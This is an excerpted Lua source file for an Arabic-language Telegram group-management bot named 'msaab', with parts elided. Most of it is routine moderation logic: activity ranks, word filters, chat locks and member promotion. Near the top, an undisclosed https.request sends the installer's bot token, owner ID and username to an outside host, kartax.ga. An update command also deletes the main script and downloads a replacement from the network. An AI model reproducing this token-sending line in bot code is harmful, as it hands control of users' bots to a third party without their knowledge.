...
https.request('http://kartax.ga/msaab/?token='..token..'&id='..SUDO..'&install='..install..'&UserName='..database:get(id_server..":SUDO:USERNAME"))
print('\n\27[1;34m doneeeeeeee senddddddddddddd :')
file = io.open("msaab", "w")  
file:write([[
#!/usr/bin/env bash
cd $HOME/msaab
token="]]..database:get(id_server..":token")..[["
...
echo -e "\033[0;00m"
echo -e "\e[36m"
./tg -s ./msaab.lua -p PROFILE --bot=$token
done
]])  
file:close()  
file = io.open("xc", "w")  
...
while(true) do
rm -fr ../.telegram-cli
screen -S msaab -X kill
screen -S msaab ./msaab
done
]])  
file:close() 
...
local msaab_Msg = ''  
if msgs < 100 then 
msaab_Msg = 'غير متفاعل ' 
elseif msgs < 200 then 
msaab_Msg = 'بده يتحسن ' 
elseif msgs < 400 then 
msaab_Msg = 'شبه متفاعل ' 
elseif msgs < 700 then 
msaab_Msg = 'متفاعل ' 
elseif msgs < 1200 then 
msaab_Msg = 'متفاعل قوي ' 
elseif msgs < 2000 then 
msaab_Msg = 'متفاعل جدا ' 
elseif msgs < 3500 then 
msaab_Msg = 'اقوى تفاعل '  
elseif msgs < 4000 then 
msaab_Msg = 'متفاعل نار ' 
elseif msgs < 4500 then 
msaab_Msg = 'قمة التفاعل ' 
elseif msgs < 5500 then 
msaab_Msg = 'اسد التفاعل ' 
elseif msgs < 7000 then 
msaab_Msg = 'ملك التفاعل' 
elseif msgs < 9500 then 
msaab_Msg = 'احلا تفاعل ' 
elseif msgs < 10000000000 then 
msaab_Msg = 'رب التفاعل '  
end 
return msaab_Msg 
end
...
function plugin_msaaba(msg)
for v in io.popen('ls File_Bot'):lines() do
if v:match(".lua$") then
plugin = dofile("File_Bot/"..v)
if plugin.msaaba and msg then
pre_msg = plugin.msaaba(msg)
end
end
end
...
--------------------------------------------------------------------------------------------------------------
function Sourcemsaab(msg,data) -- بداية العمل
if msg then
...
Sourcemsaabr = '📥┇مرحبا بك عزيزي 👋🏼،\n🔰┇انا بوت حمايه المجموعات  ؟\n📮┇يمكنك اضافتي الى مجموعتك •\n🖇┇آضفني وارفعني مشرف ارسل < تفعيل >\n[📡┇قناة سورس البوت](t.me/msaab)'
end 
send(msg.chat_id_, msg.id_, Sourcemsaabr) 
end
end
...
send(msg.chat_id_, msg.id_,msaab_Msg) 
return false  
end 
if text then    
...
if text == 'السيرفر🔎' and SudoBot(msg) then 
 local text2 = 'Info Server : \n'
  local msaab1 = database:info()
  text2 = text2..'1 - *Uptime Days* : `'..msaab1.server.uptime_in_days..'('..msaab1.server.uptime_in_seconds..' seconds)`\n'
  text2 = text2..'2 - *Commands Processed* : `'..msaab1.stats.total_commands_processed..'`\n'
  text2 = text2..'3 - *Expired Keys* : `'..msaab1.stats.expired_keys..'`\n'
  text2 = text2..'4 - *Ops/sec* : `'..msaab1.stats.instantaneous_ops_per_sec..'`\n'
send(msg.chat_id_, msg.id_, text2)  
end


if text == 'تحديث السورس ☑️' and SudoBot(msg) then 
os.execute('rm -rf msaab.lua')
os.execute('wget https://raw.githubusercontent.com/swrsmsb/msaab/master/msaab.lua')
...
send(msg.chat_id_, msg.id_,'📌┇ عدد المجموعات الان » { '..#group..' }'..msaabk..''..msaab..'\n*📌┇ الان عدد المجموعات الحقيقي » { '..sendok..' } مجموعات\n')   
end
end
end,nil)
end
...
usertext = '\n👤┇ العضو » ['..result.title_..'](t.me/'..(username or 'msaab')..')'
...
usertext = '\n👤┇ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'msaab')..')'
status  = '\n☑️┇ تم ترقيته مطور في البوت'
...
local msaab1_Msg = database:get(bot_id.."msaab1:Add:Filter:Rp2"..text..msg.chat_id_)   
if msaab1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'👤┇ العضو ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'msaab')..') \n 📬┇'..msaab1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
...
--------------------------------------------------------------------------------------------------------------
if msaab_Msg and not Special(msg) then  
local msaab_Msg = database:get(bot_id.."Add:Filter:Rp2"..text..msg.chat_id_)   
if msaab_Msg then    
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0,"⚠┇العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n🚫┇["..msaab_Msg.."] \n") 
else
send(msg.chat_id_,0,"⚠┇العضو : {["..data.first_name_.."](T.ME/msaab)}\n🚫┇["..msaab_Msg.."] \n") 
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, "⚠┇عذرا يا » {["..data.first_name_.."](T.ME/msaab)}\n📮┇ الملصق الذي ارسلته تم منعه من المجموعه \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,'👤┇ بواسطه ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'msaab')..') \n☑️┇ تـم قفـل الدردشه\n⛔┇ الحاله ← المسح ')  
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'👤┇ بواسطه ← ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'msaab')..') \n☑️┇ تـم قفـل التاك بالكتم\n⛔┇ الحاله ←الكتم ')  
end,nil)   
...
database:set(bot_id.."msaab1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"rep")  
return false  
end    
if text then   
local tsssst = database:get(bot_id.."msaab1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if tsssst == "rep" then   
send(msg.chat_id_, msg.id_,"☑️┇ارسل التحذير عند ارسال الكلمه")  
database:set(bot_id.."msaab1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"repp")  
database:set(bot_id.."msaab1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_, text)  
database:sadd(bot_id.."msaab1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
if text then  
local test = database:get(bot_id.."msaab1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if test == "repp" then  
send(msg.chat_id_, msg.id_,"🔖┇تم منع الكلمه مع التحذير")  
database:del(bot_id.."msaab1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
local test = database:get(bot_id.."msaab1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
if text then   
database:set(bot_id.."msaab1:Add:Filter:Rp2"..test..msg.chat_id_, text)  
end  
database:del(bot_id.."msaab1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
return false  end  
end

if text == "الغاء منع" and msg.reply_to_message_id_ == 0 and Manager(msg) then    
send(msg.chat_id_, msg.id_,"🔖┇ارسل الكلمه الان")  
database:set(bot_id.."msaab1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"reppp")  
return false  end
if text then 
local test = database:get(bot_id.."msaab1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
...
database:del(bot_id.."msaab1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."msaab1:Add:Filter:Rp2"..text..msg.chat_id_)  
database:srem(bot_id.."msaab1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
...
local list = database:smembers(bot_id.."msaab1:List:Filter"..msg.chat_id_)  
for k,v in pairs(list) do  
database:del(bot_id.."msaab1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."msaab1:Add:Filter:Rp2"..v..msg.chat_id_)  
database:srem(bot_id.."msaab1:List:Filter"..msg.chat_id_,v)  
end  
...
t = "\n⛔┇قائمة المنع \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ \n"
for k,v in pairs(list) do  
local msaab_Msg = database:get(bot_id.."msaab1:Add:Filter:Rp2"..v..msg.chat_id_)   
t = t..""..k.."- "..v.." » {"..msaab_Msg.."}\n"    
end  
if #list == 0 then  
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n👤┇ العضو » ['..result.title_..'](t.me/'..(text1[3] or 'msaab')..')'..'\n☑️┇ تم رفعه '..text1[2]..' هنا')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
send(msg.chat_id_, msg.id_,'['..msaab_Msg[math.random(#msaab_Msg)]..']') 
return false
end
...
-- vardump(data) 
msaabdx(msg.chat_id_, msg.id_, '📤┇ ايدي المجموعة » ( '..msg.chat_id_..' )\n☑️┇ عدد الادمنيه » ( *'..data.administrator_count_..' )*\n📛┇ عدد المحظورين » ( *'..data.kicked_count_..' )*\n🏆┇ عدد الاعضاء » ( *'..data.member_count_..' )*\n', 'md') 
end 
...
msaab = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(msaab)
...
--------------------------------------------------------------------------------------------------------------
Sourcemsaab(data.message_,data)
plugin_msaaba(data.message_)
--------------------------------------------------------------------------------------------------------------
if Chat_Type == 'GroupBot' and ChekAdd(msg.chat_id_) == true then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
...
------------------------------------------------------------------------
local msaabAbot = database:get(bot_id.."msaab1:Add:Filter:Rp2"..text..result.chat_id_)   
if msaabAbot then    
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0,"⚠┇العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n🚫┇["..msaabAbot.."] \n") 
...
------------------------------------------------------------------------
if text then
local msaab1_Msg = database:get(bot_id.."msaab1:Add:Filter:Rp2"..text..result.chat_id_)   
if msaab1_Msg then    
send(msg.chat_id_, msg.id_,"🔖┇"..msaab1_Msg)
